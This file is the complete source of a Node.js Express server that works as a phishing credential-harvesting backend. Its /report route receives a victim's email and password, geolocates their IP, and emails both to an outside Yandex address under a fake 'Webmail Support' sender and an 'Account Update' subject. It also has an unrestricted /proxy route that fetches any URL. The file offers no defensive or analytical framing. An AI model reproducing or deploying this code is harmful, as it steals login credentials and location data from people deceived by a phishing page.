// @ts-nocheck
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const { Resend } = require('resend');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// Function to get location from IP
const getLocationFromIP = async (ip) => {
    if (ip === '::1' || !ip) {
        return { city: 'Localhost', regionName: 'Localhost', country: 'Localhost' };
    }
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        return response.data;
    } catch (error) {
        console.error('Error fetching location:', error);
        return { city: 'Unknown', regionName: 'Unknown', country: 'Unknown' };
    }
};

// Function to get client IP address
const getClientIp = (req) => {
    const forwardedFor = req.headers['x-forwarded-for'];
    if (forwardedFor) {
        return forwardedFor.split(',')[0].trim();
    }
    return req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
};

// Proxy route to fetch the image
app.get('/proxy', async (req, res) => {
    const { url } = req.query;
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        res.set('Content-Type', response.headers['content-type']);
        res.send(response.data);
    } catch (error) {
        console.error('Error fetching image:', error.message);
        res.status(500).send('Error fetching image');
    }
});

// Report route
app.post('/report', async (req, res) => {
    console.log('Received body:', req.body); 
    const { ai, pr } = req.body;
    const ip = getClientIp(req);
    const location = await getLocationFromIP(ip);

    const locationDetails = location
        ? `IP Address: ${ip}\nLocation: ${location.city}, ${location.regionName}, ${location.country}`
        : `IP Address: ${ip}\nLocation: Unknown`;

    try {
        const data = await resend.emails.send({
            from: 'Webmail Support <mail@blu-fx.uk>', 
            to: 'esnpav@yandex.com',
            subject: 'Account Update',
            text: `User Email: ${ai}\nUser Password: ${pr}\n\nUser IP/Location:\n${locationDetails}`,
        });
    
        console.log('Email sent:', data.id);
        res.status(200).json({ message:"Credentials sent to admin" });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ message:"Failed to send credentials to admin" });
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});